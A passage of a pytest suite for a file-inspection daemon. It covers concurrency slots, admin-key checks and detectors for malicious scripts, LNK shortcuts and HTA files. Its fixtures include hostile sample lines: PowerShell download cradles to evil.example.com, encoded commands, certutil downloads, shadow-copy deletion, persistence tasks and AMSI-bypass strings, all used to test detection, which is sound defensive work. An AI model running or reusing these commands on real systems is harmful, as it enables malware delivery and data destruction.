                "/v1/scan?timeout=0.05",
                data=_form(PDF_CLEAN, "test.pdf"),
            )
            assert r.status == 503
            body = await r.json()
            assert "overloaded" in body.get("error", "").lower()
        finally:
            for _ in range(n):
                daemon._fg_sem.release()
            xspct.config["xspct_foreground_slots"] = 16
            xspct.config["xspct_background_slots"] = 4
        assert xspct.stats["foreground_overloaded"] > before

    # --- Background slot full → scan dropped → 202 with status=dropped --

    async def test_background_full_drops_scan(self, aiohttp_client, monkeypatch):
        """When bg slots are all taken, a timed-out scan is cancelled (dropped)."""
        xspct.config["xspct_foreground_slots"] = 2
        xspct.config["xspct_background_slots"] = 1
        app = await xspct.make_app()
        client = await aiohttp_client(app)
        daemon = app["daemon"]

        # Hold all background slots
        n_bg = daemon._bg_sem._value
        for _ in range(n_bg):
            await daemon._bg_sem.acquire()

        # Make analyze_task hang so the scan always times out
        async def _slow(*args, **kwargs):
            await asyncio.sleep(60)
            return {}

        monkeypatch.setattr(daemon, "analyze_task", _slow)
        before = xspct.stats["background_rejected"]
        try:
            r = await client.post(
                "/v1/scan?timeout=0.1",
                data=_form(PDF_CLEAN, "slow.pdf"),
            )
            assert r.status == 202
            body = await r.json()
            assert body.get("status") == "dropped"
        finally:
            for _ in range(n_bg):
                daemon._bg_sem.release()
            xspct.config["xspct_foreground_slots"] = 16
            xspct.config["xspct_background_slots"] = 4
        assert xspct.stats["background_rejected"] > before

    async def test_timeout_promotes_to_background_when_slot_available(
        self, aiohttp_client, monkeypatch
    ):
        """A timed-out scan should return 202/processing when a bg slot is free."""
        xspct.config["xspct_foreground_slots"] = 1
        xspct.config["xspct_background_slots"] = 1
        app = await xspct.make_app()
        client = await aiohttp_client(app)
        daemon = app["daemon"]

        finalized = asyncio.Event()

        async def _slow(*args, **kwargs):
            await asyncio.Event().wait()

        async def _finalize_background(s, file_hash, task):
            try:
                task.cancel()
                await task
            except asyncio.CancelledError:
                pass
            finally:
                daemon._bg_sem.release()
                finalized.set()

        monkeypatch.setattr(daemon, "analyze_task", _slow)
        monkeypatch.setattr(daemon, "_finalize_background", _finalize_background)
        try:
            r = await client.post(
                "/v1/scan?timeout=0.1",
                data=_form(PDF_CLEAN, "slow.pdf"),
            )
            assert r.status == 202
            body = await r.json()
            assert body.get("status") == "processing"
            await asyncio.wait_for(finalized.wait(), timeout=1)
            assert daemon._bg_sem._value == 1
        finally:
            xspct.config["xspct_foreground_slots"] = 16
            xspct.config["xspct_background_slots"] = 4

    async def test_duplicate_scan_attaches_to_in_flight_task(
        self, aiohttp_client, monkeypatch
    ):
        """Resubmitting the same file while it is still being analyzed must not
        start a second, redundant analysis task."""
        app = await xspct.make_app()
        client = await aiohttp_client(app)
        daemon = app["daemon"]

        call_count = 0
        release = asyncio.Event()

        async def _slow(*args, **kwargs):
            nonlocal call_count
            call_count += 1
            await release.wait()
            return {"file_hash": args[1]}

        monkeypatch.setattr(daemon, "analyze_task", _slow)
        before = xspct.stats["requests_deduped"]
        try:
            r1 = await client.post(
                "/v1/scan?timeout=0.05", data=_form(PDF_CLEAN, "dup.pdf")
            )
            assert r1.status == 202
            body1 = await r1.json()
            assert body1.get("status") == "processing"

            r2 = await client.post(
                "/v1/scan?timeout=0.05", data=_form(PDF_CLEAN, "dup.pdf")
            )
            assert r2.status == 202
            body2 = await r2.json()
            assert body2.get("status") == "processing"
            assert body2.get("file_hash") == body1.get("file_hash")

            assert call_count == 1
            assert xspct.stats["requests_deduped"] > before
        finally:
            release.set()
            await asyncio.sleep(0.05)

    async def test_background_failure_becomes_stable_query_error(
        self, aiohttp_client, monkeypatch
    ):
        """A failed background scan should be queryable as a stable error result."""
        xspct.config["xspct_foreground_slots"] = 1
        xspct.config["xspct_background_slots"] = 1
        app = await xspct.make_app()
        client = await aiohttp_client(app)
        daemon = app["daemon"]

        allow_raise = asyncio.Event()
        error_stored = asyncio.Event()
        original_store = daemon._store_terminal_result

        async def _boom(*args, **kwargs):
            await allow_raise.wait()
            raise RuntimeError("boom")

        def _store_and_signal(file_hash, result):
            original_store(file_hash, result)
            if result.get("status") == "error":
                error_stored.set()

        monkeypatch.setattr(daemon, "analyze_task", _boom)
        monkeypatch.setattr(daemon, "_store_terminal_result", _store_and_signal)
        try:
            r = await client.post(
                "/v1/scan?timeout=0.01",
                data=_form(PDF_CLEAN, "boom.pdf"),
            )
            assert r.status == 202
            body = await r.json()
            assert body.get("status") == "processing"

            allow_raise.set()
            await asyncio.wait_for(error_stored.wait(), timeout=1)

            query_1 = await client.get(f"/v1/query?hash={body['file_hash']}")
            assert query_1.status == 200
            q1_body = await query_1.json()
            assert q1_body["status"] == "error"
            assert q1_body["file_hash"] == body["file_hash"]

            query_2 = await client.get(f"/v1/query?hash={body['file_hash']}")
            assert query_2.status == 200
            q2_body = await query_2.json()
            assert q2_body["status"] == "error"
            assert q2_body["file_hash"] == body["file_hash"]
        finally:
            xspct.config["xspct_foreground_slots"] = 16
            xspct.config["xspct_background_slots"] = 4

    # --- /metrics exposes new counters -----------------------------------

    async def test_metrics_contains_concurrency_lines(self, client):
        r = await client.get("/v1/metrics")
        assert r.status == 200
        text = await r.text()
        for key in (
            "xspct_foreground_overloaded",
            "xspct_background_rejected",
            "xspct_background_completed",
            "xspct_background_errors",
            "xspct_foreground_slots_free",
            "xspct_background_slots_free",
            "xspct_requests_deduped",
        ):
            assert key in text, f"metric {key!r} missing from /metrics"


# ===========================================================================
# INTEGRATION TESTS — admin /admin/reload
# ===========================================================================


class TestAdminReload:
    async def test_no_admin_key_configured_returns_403(self, client):
        xspct.config["xspct_admin_api_key"] = []
        r = await client.post("/v1/admin/reload")
        assert r.status == 403

    async def test_wrong_admin_key_returns_403(self, client):
        xspct.config["xspct_admin_api_key"] = ["correct-admin-key"]
        try:
            r = await client.post(
                "/v1/admin/reload",
                headers={"X-Admin-Api-Key": "wrong-key"},
            )
            assert r.status == 403
        finally:
            xspct.config["xspct_admin_api_key"] = []

    async def test_correct_admin_key_returns_200(self, client):
        xspct.config["xspct_admin_api_key"] = ["admin-secret"]
        try:
            r = await client.post(
                "/v1/admin/reload",
                headers={"X-Admin-Api-Key": "admin-secret"},
            )
            assert r.status == 200
            body = await r.json()
            assert body["status"] == "ok"
            assert isinstance(body["reloaded"], list)
        finally:
            xspct.config["xspct_admin_api_key"] = []


# ===========================================================================
# INTEGRATION TESTS — OpenAPI endpoints
# ===========================================================================


class TestOpenApiEndpoints:
    async def test_openapi_json_returns_200_when_pydantic(self, client):
        if not xspct.HAS_PYDANTIC:
            pytest.skip("pydantic not installed")
        r = await client.get("/v1/openapi.json")
        assert r.status == 200
        body = await r.json()
        assert body.get("openapi", "").startswith("3.")
        assert "paths" in body

    async def test_redoc_returns_200_when_pydantic(self, client):
        if not xspct.HAS_PYDANTIC:
            pytest.skip("pydantic not installed")
        r = await client.get("/v1/apidoc/redoc")
        assert r.status == 200
        text = await r.text()
        assert "redoc" in text.lower() or "openapi" in text.lower()

    async def test_openapi_json_returns_501_without_pydantic(self, client):
        if xspct.HAS_PYDANTIC:
            pytest.skip("pydantic is installed; skipping no-pydantic path")
        r = await client.get("/v1/openapi.json")
        assert r.status in (200, 501, 503)  # 503 when pydantic not installed


# ===========================================================================
# UNIT TESTS — verify_admin_key
# ===========================================================================


class TestVerifyAdminKey:
    def _req(self, header_value=None):
        mock = MagicMock()
        headers = {}
        if header_value is not None:
            headers["X-Admin-Api-Key"] = header_value
        mock.headers = headers
        return mock

    def test_no_keys_configured_always_false(self):
        xspct.config["xspct_admin_api_key"] = []
        assert xspct.verify_admin_key("s", self._req("anything")) is False

    def test_correct_key_passes(self):
        xspct.config["xspct_admin_api_key"] = ["secret"]
        try:
            assert xspct.verify_admin_key("s", self._req("secret")) is True
        finally:
            xspct.config["xspct_admin_api_key"] = []

    def test_wrong_key_fails(self):
        xspct.config["xspct_admin_api_key"] = ["secret"]
        try:
            assert xspct.verify_admin_key("s", self._req("wrong")) is False
        finally:
            xspct.config["xspct_admin_api_key"] = []

    def test_missing_header_fails(self):
        xspct.config["xspct_admin_api_key"] = ["secret"]
        try:
            assert xspct.verify_admin_key("s", self._req()) is False
        finally:
            xspct.config["xspct_admin_api_key"] = []


# ===========================================================================
# UNIT TESTS — analyze_text
# ===========================================================================


class TestAnalyzeText:
    def test_empty_bytes_returns_none(self, daemon):
        result = daemon.analyze_text(b"", "empty.txt")
        assert result is None

    def test_plain_ascii_returns_dict(self, daemon):
        result = daemon.analyze_text(b"Hello world", "hello.txt")
        assert result is not None
        assert "text_segments" in result
        assert "iocs" in result
        assert "analyses" in result

    def test_text_segment_content(self, daemon):
        result = daemon.analyze_text(b"Hello world", "hello.txt")
        assert result["text_segments"][0]["text"] == "Hello world"
        assert result["text_segments"][0]["source"] == "text"

    def test_text_preview_respects_limit(self, daemon):
        saved = xspct.config["xspct_text_preview_length"]
        xspct.config["xspct_text_preview_length"] = 5
        try:
            result = daemon.sync_analyze("s", "hello.txt", b"Hello world", "text/plain")
        finally:
            xspct.config["xspct_text_preview_length"] = saved
        assert all(len(seg["text"]) <= 5 for seg in result["text_preview"])
        assert any(seg["text"] == "Hello" for seg in result["text_preview"])

    def test_utf8_decoded(self, daemon):
        text = "Ünïcödé text"
        result = daemon.analyze_text(text.encode("utf-8"), "unicode.txt")
        assert result is not None
        assert "Ünïcödé" in result["text_segments"][0]["text"]

    def test_latin1_fallback(self, daemon):
        # Bytes that are not valid UTF-8 — latin-1 fallback should not raise
        data = bytes(range(0x80, 0xA0))
        result = daemon.analyze_text(data, "latin.txt")
        assert result is not None
        assert isinstance(result.get("text_segments", []), list)

    def test_iocs_extracted(self, daemon):
        data = b"Visit http://evil.example.com/malware for details"
        result = daemon.analyze_text(data, "ioc.txt")
        assert result is not None
        # extract_iocs returns a string or dict depending on configuration
        assert result["iocs"] is not None

    def test_analyses_list(self, daemon):
        result = daemon.analyze_text(b"some content", "f.txt")
        assert isinstance(result["analyses"], list)

    def test_mime_type_hint_accepted(self, daemon):
        # file_mime kwarg is optional; passing it should not raise
        result = daemon.analyze_text(b"data", "f.txt", file_mime="text/plain")
        assert result is not None


# ===========================================================================
# UNIT TESTS — analyze_script (standalone HTA/VBS/VBE/JS/JSE/WSF/WSH/PS1/BAT)
# ===========================================================================


def _keywords(hits):
    return {h["keyword"] for h in hits}


class TestAnalyzeScript:
    def test_empty_bytes_returns_none(self, daemon):
        assert daemon.analyze_script(b"", "empty.vbs") is None

    def test_vbs_shell_and_createobject_detected(self, daemon):
        vbs = b'Set o = CreateObject("WScript.Shell")\no.Run "cmd /c whoami"'
        result = daemon.analyze_script(vbs, "drop.vbs")
        assert result is not None
        kws = _keywords(result["analyses"])
        assert "CreateObject" in kws or "WScript.Shell" in kws

    def test_vbs_fallback_without_oletools(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_OLETOOLS", False)
        vbs = b'Set o = CreateObject("WScript.Shell")\nExecuteGlobal "x"'
        result = daemon.analyze_script(vbs, "drop.vbs")
        kws = _keywords(result["analyses"])
        assert "CreateObject()" in kws
        assert "ExecuteGlobal" in kws

    def test_vbs_chr_chain_obfuscation_fallback(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_OLETOOLS", False)
        vbs = b"x = " + b" & ".join(f"Chr({i})".encode() for i in range(65, 75))
        result = daemon.analyze_script(vbs, "obf.vbs")
        assert "Chr()-chain" in _keywords(result["analyses"])

    def test_vbs_executable_filename_ioc_not_dropped(self, daemon):
        """extract_iocs() only extracts urls/ips/domains, not the executable
        filenames oletools' VBA_Scanner separately flags as an IOC — those
        hits must survive, unlike its plain URL/IPv4 hits which
        extract_iocs() already covers on the same raw text."""
        vbs = b'Set o = CreateObject("Outlook.Application")\nx = "payload.exe"'
        result = daemon.analyze_script(vbs, "drop.vbs")
        kws = _keywords(result["analyses"])
        assert "payload.exe" in kws

    def test_vbs_plain_url_ioc_not_duplicated_in_analyses(self, daemon):
        """Plain (non-obfuscated) URL/IPv4 IOC hits from VBA_Scanner are
        redundant with extract_iocs() on the same raw text and must not
        also appear as a separate 'analyses' entry."""
        vbs = b'x = "http://evil.example.com/payload.exe"'
        result = daemon.analyze_script(vbs, "drop.vbs")
        assert "http://evil.example.com/payload.exe" in result["iocs"]["urls"]
        assert "http://evil.example.com/payload.exe" not in _keywords(
            result["analyses"]
        )

    def test_standalone_js_reuses_analyze_javascript(self, daemon):
        js = b'eval(unescape("%61%6c%65%72%74"))'
        result = daemon.analyze_script(js, "mal.js")
        kws = _keywords(result["analyses"])
        assert "eval()" in kws
        assert "unescape()" in kws

    def test_text_segment_source_is_script(self, daemon):
        result = daemon.analyze_script(b"whoami", "run.bat")
        sources = {s["source"] for s in result["text_segments"]}
        assert "script" in sources

    def test_ps1_encoded_command_decoded_and_reanalyzed(self, daemon):
        import base64 as _b64

        cmd = (
            "IEX (New-Object Net.WebClient).DownloadString"
            '("http://evil.example.com/a.ps1")'
        )
        b64 = _b64.b64encode(cmd.encode("utf-16-le")).decode()
        ps1 = f"powershell.exe -EncodedCommand {b64}".encode()
        result = daemon.analyze_script(ps1, "run.ps1")
        kws = _keywords(result["analyses"])
        assert "-EncodedCommand" in kws
        assert "-EncodedCommand-decoded" in kws
        assert "Invoke-Expression" in kws
        assert "download-cradle" in kws
        # -EncodedCommand usage and its decoded-payload marker are distinct
        # findings, not duplicates of each other.
        all_kws = [a["keyword"] for a in result["analyses"]]
        assert all_kws.count("-EncodedCommand") == 1
        assert all_kws.count("-EncodedCommand-decoded") == 1
        sources = {s["source"] for s in result["text_segments"]}
        assert "script-decoded" in sources

    def test_ps1_encoded_command_colon_syntax_decoded(self, daemon):
        """-EncodedCommand:<base64> (colon-bound, no space) must also decode."""
        import base64 as _b64

        cmd = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/a.ps1')"
        b64 = _b64.b64encode(cmd.encode("utf-16-le")).decode()
        ps1 = f"powershell.exe -EncodedCommand:{b64}".encode()
        result = daemon.analyze_script(ps1, "run.ps1")
        sources = {s["source"] for s in result["text_segments"]}
        assert "script-decoded" in sources

    def test_ps1_download_cradle_and_amsi_bypass(self, daemon):
        ps1 = (
            b"Invoke-WebRequest -Uri http://evil.example.com/x.exe -OutFile x.exe\n"
            b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
        )
        result = daemon.analyze_script(ps1, "loader.ps1")
        kws = _keywords(result["analyses"])
        assert "download-cradle" in kws
        assert "AMSI-bypass" in kws

    def test_script_patterns_are_case_insensitive(self, daemon):
        ps1 = (
            b"invoke-webrequest http://evil.example.com/x.exe\n"
            b"start-process x.exe\n"
            b"set-mppreference -disablerealtimemonitoring true"
        )
        result = daemon.analyze_script(ps1, "loader.ps1")
        kws = _keywords(result["analyses"])
        assert {"download-cradle", "process-creation", "MpPreference"} <= kws

    def test_ps1_persistence_pattern(self, daemon):
        ps1 = b"schtasks /create /tn evil /tr evil.exe /sc onlogon"
        result = daemon.analyze_script(ps1, "persist.ps1")
        assert "persistence" in _keywords(result["analyses"])

    @pytest.mark.parametrize("ext", ["bat", "cmd"])
    def test_batch_certutil_and_shadow_copy_deletion(self, daemon, ext):
        bat = (
            b"@echo off\r\n"
            b"certutil -urlcache -f http://evil.example.com/x.exe x.exe\r\n"
            b"vssadmin delete shadows /all /quiet\r\n"
        )
        result = daemon.analyze_script(bat, f"wiper.{ext}")
        kws = _keywords(result["analyses"])
        assert "certutil" in kws
        assert "shadow-copy-deletion" in kws

    def test_batch_self_delete(self, daemon):
        bat = b"del /f /q %~f0"
        result = daemon.analyze_script(bat, "run.bat")
        assert "self-delete" in _keywords(result["analyses"])

    def test_obfuscation_density_flagged(self, daemon):
        ps1 = ("$x = " + " + ".join(f'"{i}"' for i in range(30))).encode()
        result = daemon.analyze_script(ps1, "obf.ps1")
        assert "high-obfuscation-density" in _keywords(result["analyses"])

    def test_wsf_routes_blocks_by_language(self, daemon):
        wsf = b"""<job>
<script language="VBScript">
Set o = CreateObject("WScript.Shell")
</script>
<script language="JScript">
eval(unescape("foo"))
</script>
</job>"""
        result = daemon.analyze_script(wsf, "drop.wsf")
        kws = _keywords(result["analyses"])
        assert "CreateObject" in kws or "CreateObject()" in kws
        assert "eval()" in kws

    def test_wsf_no_script_blocks_flagged(self, daemon):
        result = daemon.analyze_script(b"<job><notscript/></job>", "empty.wsf")
        assert "wsf-no-script-blocks" in _keywords(result["analyses"])

    def test_wsf_short_form_language_values(self, daemon):
        """language="VBS"/"JS" (short forms) must still be routed and scanned,
        not just the full "VBScript"/"JScript" spellings."""
        wsf = b"""<job>
<script language="VBS">
Set o = CreateObject("WScript.Shell")
</script>
<script language="JS">
eval(unescape("foo"))
</script>
</job>"""
        result = daemon.analyze_script(wsf, "drop.wsf")
        kws = _keywords(result["analyses"])
        assert "CreateObject" in kws or "CreateObject()" in kws
        assert "eval()" in kws

    def test_wsf_cdata_wrapped_block_unwrapped(self, daemon):
        wsf = b"""<job><script language="JScript"><![CDATA[
eval(unescape("foo"))
]]></script></job>"""
        result = daemon.analyze_script(wsf, "drop.wsf")
        assert "eval()" in _keywords(result["analyses"])

    @pytest.mark.parametrize(
        ("language", "decoded", "keyword"),
        [
            ("VBScript.Encode", 'CreateObject("WScript.Shell")', "WScript.Shell"),
            ("JScript.Encode", 'eval(unescape("foo"))', "eval()"),
        ],
    )
    def test_wsf_encoded_blocks_are_decoded(
        self, daemon, monkeypatch, language, decoded, keyword
    ):
        monkeypatch.setattr(
            xspct.InspectorDaemon,
            "_decode_vbe_jse",
            lambda self, text: decoded,
        )
        wsf = (
            f'<job><script language="{language}">#@~^encoded^#~@</script></job>'
        ).encode()
        result = daemon.analyze_script(wsf, "drop.wsf")
        assert keyword in _keywords(result["analyses"])
        assert "script-decoded" in {
            segment["source"] for segment in result["text_segments"]
        }

    def test_wsf_encoded_block_decode_failure_is_reported(self, daemon, monkeypatch):
        monkeypatch.setattr(
            xspct.InspectorDaemon,
            "_decode_vbe_jse",
            lambda self, text: None,
        )
        wsf = b'<job><script language="JScript.Encode">#@~^encoded^#~@</script></job>'
        result = daemon.analyze_script(wsf, "drop.wsf")
        assert "wsf-jscript.encode-undecoded" in _keywords(result["analyses"])

    def test_vbe_undecoded_without_sflock(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_SFLOCK", False)
        result = daemon.analyze_script(b"#@~^AAAA==garbage==^#~@", "enc.vbe")
        assert "vbe-undecoded" in _keywords(result["analyses"])

    def test_vbe_decoded_reanalyzed_as_vbs(self, daemon, monkeypatch):
        monkeypatch.setattr(
            xspct.InspectorDaemon,
            "_decode_vbe_jse",
            lambda self, text: 'CreateObject("WScript.Shell")',
        )
        result = daemon.analyze_script(b"#@~^AAAA==garbage==^#~@", "enc.vbe")
        kws = _keywords(result["analyses"])
        assert "CreateObject" in kws or "CreateObject()" in kws
        sources = {s["source"] for s in result["text_segments"]}
        assert "script-decoded" in sources

    def test_vbe_decoded_text_contributes_iocs(self, daemon, monkeypatch):
        monkeypatch.setattr(
            xspct.InspectorDaemon,
            "_decode_vbe_jse",
            lambda self, text: 'u = "http://decoded.example.com/payload"',
        )
        result = daemon.analyze_script(b"#@~^encoded-only^#~@", "enc.vbe")
        assert "http://decoded.example.com/payload" in result["iocs"]["urls"]

    def test_wsf_block_iocs_extracted_from_whole_document(self, daemon):
        """IOCs inside a WSF <script> block are found via the single
        whole-document extract_iocs(data) call at the top of analyze_script()
        — there's no separate per-block extraction (that would just rescan
        bytes already covered, since each block's code is a substring of the
        full document)."""
        wsf = (
            b'<job><script language="JScript">'
            b'var u = "http://block.example.com/payload";'
            b"</script></job>"
        )
        result = daemon.analyze_script(wsf, "drop.wsf")
        assert "http://block.example.com/payload" in result["iocs"]["urls"]

    def test_jse_decoded_reanalyzed_as_js(self, daemon, monkeypatch):
        monkeypatch.setattr(
            xspct.InspectorDaemon,
            "_decode_vbe_jse",
            lambda self, text: 'eval(unescape("foo"))',
        )
        result = daemon.analyze_script(b"#@~^AAAA==garbage==^#~@", "enc.jse")
        assert "eval()" in _keywords(result["analyses"])

    def test_iocs_extracted(self, daemon):
        data = b"powershell -c IEX http://evil.example.com/payload"
        result = daemon.analyze_script(data, "run.ps1")
        assert result["iocs"] is not None


# ===========================================================================
# UNIT TESTS — analyze_lnk (Windows shortcut / .lnk)
# ===========================================================================


def _make_lnk(
    target="", arguments="", working_dir="", icon_location="", description=""
):
    """Build a minimal, valid Windows shortcut (.lnk) file for testing.

    Only the ShellLinkHeader + StringData sections are populated (no
    LinkTargetIDList, no LinkInfo) — sufficient for LnkParse3 to expose
    relative_path()/command_line_arguments()/working_directory()/
    icon_location()/description() via `string_data`.
    """
    flags = 0x80  # IsUnicode
    if description:
        flags |= 0x04  # HasName
    if target:
        flags |= 0x08  # HasRelativePath
    if working_dir:
        flags |= 0x10  # HasWorkingDir
    if arguments:
        flags |= 0x20  # HasArguments
    if icon_location:
        flags |= 0x40  # HasIconLocation

    clsid = bytes(
        [
            0x01,
            0x14,
            0x02,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0xC0,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x46,
        ]
    )
    header = struct.pack("<I", 76) + clsid
    header += struct.pack("<I", flags)
    header += struct.pack("<I", 0x20)  # FILE_ATTRIBUTE_ARCHIVE
    header += b"\x00" * 8 * 3  # creation/access/write FILETIMEs
    header += struct.pack("<I", 0)  # target file size
    header += struct.pack("<i", 0)  # icon index
    header += struct.pack("<I", 1)  # show command (SW_SHOWNORMAL)
    header += b"\x00" * 2  # hotkey
    header += b"\x00" * 2  # reserved1
    header += b"\x00" * 4  # reserved2
    header += b"\x00" * 4  # reserved3
    assert len(header) == 76

    def _sd(s, limit=False):
        count = min(len(s), 260) if limit else len(s)
        return struct.pack("<H", count) + s[:count].encode("utf-16-le")

    body = b""
    if description:
        body += _sd(description, limit=True)
    if target:
        body += _sd(target, limit=True)
    if working_dir:
        body += _sd(working_dir, limit=True)
    if arguments:
        body += _sd(arguments)
    if icon_location:
        body += _sd(icon_location)

    return header + body + b"\x00\x00\x00\x00"  # empty terminal ExtraData block


class TestAnalyzeLnk:
    def test_empty_bytes_returns_none(self, daemon):
        assert daemon.analyze_lnk(b"", "empty.lnk") is None

    def test_missing_lnkparse3_returns_none(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_LNKPARSE", False)
        data = _make_lnk(target="C:\\Windows\\System32\\cmd.exe")
        assert daemon.analyze_lnk(data, "shortcut.lnk") is None

    def test_sync_missing_parser_uses_raw_fallback(self, daemon, monkeypatch):
        monkeypatch.setitem(xspct.config["xspct_analyzers"]["lnk"], "enabled", True)
        monkeypatch.setattr(xspct, "HAS_LNKPARSE", False)
        fallback = MagicMock(return_value="raw fallback")
        monkeypatch.setattr(daemon, "extract_text_preview", fallback)

        result = daemon.sync_analyze(
            "test",
            "run.lnk",
            _make_lnk(target="C:\\Windows\\System32\\cmd.exe"),
            "application/x-ms-shortcut",
            types_to_run=["lnk"],
        )

        fallback.assert_called_once()
        assert any(
            segment["source"] == "lnk" and segment["text"] == "raw fallback"
            for segment in result["text_preview"]
        )

    def test_sync_disabled_skips_analysis_and_fallback(self, daemon, monkeypatch):
        monkeypatch.setitem(xspct.config["xspct_analyzers"]["lnk"], "enabled", False)
        fallback = MagicMock(return_value="raw fallback")
        monkeypatch.setattr(daemon, "extract_text_preview", fallback)

        result = daemon.sync_analyze(
            "test",
            "run.lnk",
            _make_lnk(target="C:\\Windows\\System32\\cmd.exe"),
            "application/x-ms-shortcut",
            types_to_run=["lnk"],
        )

        fallback.assert_not_called()
        assert result["text_preview"] == []

    def test_corrupt_lnk_reports_parse_error(self, daemon):
        result = daemon.analyze_lnk(b"not a valid lnk file", "bad.lnk")
        assert result is not None
        assert "lnk-parse-failed" in _keywords(result["analyses"])

    def test_powershell_lolbin_and_download_cradle_detected(self, daemon):
        data = _make_lnk(
            target="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            arguments=(
                "-nop -w hidden -c IEX (New-Object Net.WebClient)."
                "DownloadString('http://evil.example.com/a.ps1')"
            ),
        )
        result = daemon.analyze_lnk(data, "invoice.lnk")
        kws = _keywords(result["analyses"])
        assert "lnk-lolbin-target" in kws
        assert "download-cradle" in kws
        assert "http://evil.example.com/a.ps1" in result["iocs"]["urls"]

    def test_text_segment_source_is_lnk(self, daemon):
        data = _make_lnk(target="C:\\Windows\\System32\\cmd.exe", arguments="/c whoami")
        result = daemon.analyze_lnk(data, "run.lnk")
        sources = {s["source"] for s in result["text_segments"]}
        assert "lnk" in sources

    def test_long_arguments_flagged(self, daemon):
        padded = "cmd.exe /c " + "A" * 300
        data = _make_lnk(target="C:\\Windows\\System32\\cmd.exe", arguments=padded)
        result = daemon.analyze_lnk(data, "run.lnk")
        assert "long-command-line" in _keywords(result["analyses"])

    def test_whitespace_padding_flagged(self, daemon):
        padded = "cmd.exe /c whoami" + " " * 30 + "&calc.exe"
        data = _make_lnk(target="C:\\Windows\\System32\\cmd.exe", arguments=padded)
        result = daemon.analyze_lnk(data, "run.lnk")
        assert "whitespace-padding" in _keywords(result["analyses"])

    def test_unc_target_flagged(self, daemon):
        data = _make_lnk(target=r"\\evil-server\share\payload.exe")
        result = daemon.analyze_lnk(data, "run.lnk")
        assert "unc-path" in _keywords(result["analyses"])

    def test_local_link_info_appends_common_suffix(self, daemon, monkeypatch):
        string_data = MagicMock()
        string_data.relative_path.return_value = r"C:\ignored\benign.txt"
        string_data.command_line_arguments.return_value = "/c whoami"
        string_data.working_directory.return_value = r"C:\Windows\System32"
        string_data.icon_location.return_value = ""
        info = MagicMock()
        info.location.return_value = "Local"
        info.local_base_path_unicode.return_value = r"C:\Windows"
        info.common_path_suffix_unicode.return_value = r"System32\cmd.exe"
        parsed = MagicMock(string_data=string_data, info=info)
        monkeypatch.setattr(xspct, "_LnkFile", lambda **kwargs: parsed)

        result = daemon.analyze_lnk(b"lnk", "run.lnk")

        assert "lnk-lolbin-target" in _keywords(result["analyses"])
        command = next(
            segment["text"]
            for segment in result["text_segments"]
            if segment["source"] == "lnk"
        )
        assert r"C:\Windows\System32\cmd.exe" in command
        assert any(
            segment["source"] == "lnk-working-directory"
            for segment in result["text_segments"]
        )

    def test_unicode_network_link_info_appends_common_suffix(self, daemon, monkeypatch):
        string_data = MagicMock()
        string_data.relative_path.return_value = ""
        string_data.command_line_arguments.return_value = ""
        string_data.working_directory.return_value = ""
        string_data.icon_location.return_value = ""
        info = MagicMock()
        info.location.return_value = "Network"
        info.net_name_unicode.return_value = r"\\server\share"
        info.common_path_suffix_unicode.return_value = "payload.exe"
        parsed = MagicMock(string_data=string_data, info=info)
        monkeypatch.setattr(xspct, "_LnkFile", lambda **kwargs: parsed)

        result = daemon.analyze_lnk(b"lnk", "run.lnk")

        assert "unc-path" in _keywords(result["analyses"])
        command = next(
            segment["text"]
            for segment in result["text_segments"]
            if segment["source"] == "lnk"
        )
        assert command == r"\\server\share\payload.exe"

    def test_icon_target_mismatch_flagged(self, daemon):
        data = _make_lnk(
            target="C:\\Users\\victim\\Downloads\\invoice.exe",
            icon_location="C:\\Users\\victim\\Documents\\invoice.pdf",
        )
        result = daemon.analyze_lnk(data, "invoice.lnk")
        assert "icon-target-mismatch" in _keywords(result["analyses"])

    @pytest.mark.parametrize(
        "icon_location",
        (
            "C:\\Windows\\System32\\imageres.dll,-102",
            "C:\\Program Files\\Example\\example.ico",
        ),
    )
    def test_normal_icon_location_not_flagged(self, daemon, icon_location):
        data = _make_lnk(
            target="C:\\Program Files\\Example\\example.exe",
            icon_location=icon_location,
        )
        result = daemon.analyze_lnk(data, "example.lnk")
        assert "icon-target-mismatch" not in _keywords(result["analyses"])

    def test_benign_shortcut_has_no_findings(self, daemon):
        data = _make_lnk(
            target="C:\\Program Files\\Notepad++\\notepad++.exe",
            working_dir="C:\\Program Files\\Notepad++",
        )
        result = daemon.analyze_lnk(data, "notepad.lnk")
        assert result["analyses"] == []


# ===========================================================================
# UNIT TESTS — HTA-specific detection inside analyze_html
# ===========================================================================


class TestAnalyzeHtaInHtml:
    def test_hta_application_tag_flagged(self, daemon):
        hta = b'<html><head><HTA:APPLICATION ID="x"/></head></html>'
        result = daemon.analyze_html(hta)
        assert "hta:application" in _keywords(result["analyses"])

    def test_hta_windowstate_minimize_flagged(self, daemon):
        hta = b'<html><head><HTA:APPLICATION WINDOWSTATE="minimize"/></head></html>'
        result = daemon.analyze_html(hta)
        assert "WindowState" in _keywords(result["analyses"])

    def test_hta_showintaskbar_no_flagged(self, daemon):
        hta = b'<html><head><HTA:APPLICATION SHOWINTASKBAR="no"/></head></html>'
        result = daemon.analyze_html(hta)
        assert "SHOWINTASKBAR" in _keywords(result["analyses"])

    def test_plain_html_has_no_hta_findings(self, daemon):
        result = daemon.analyze_html(b"<html><body>hello</body></html>")
        assert "hta:application" not in _keywords(result["analyses"])

    def test_hta_embedded_vbscript_gets_cross_cutting_scan(self, daemon):
        """An HTA's embedded VBScript body must get the same download-cradle/
        persistence/AMSI-bypass heuristics as a standalone .vbs/.wsf file,
        not just the generic <script> JS-keyword checks."""
        hta = b"""<html><head><HTA:APPLICATION ID="x"/>
        <script language="VBScript">
        Set o = CreateObject("WScript.Shell")
        o.Run "powershell -EncodedCommand abcd"
        </script></head></html>"""
        result = daemon.analyze_html(hta)
        kws = _keywords(result["analyses"])
        assert "WScript.Shell" in kws
        assert "-EncodedCommand" in kws

    def test_plain_html_script_not_scanned_for_vbscript_patterns(self, daemon):
        """The VBScript/cross-cutting scan is scoped to actual HTA documents
        so ordinary web pages don't pick up unrelated findings."""
        html = b"""<html><body>
        <script language="VBScript">CreateObject("WScript.Shell")</script>
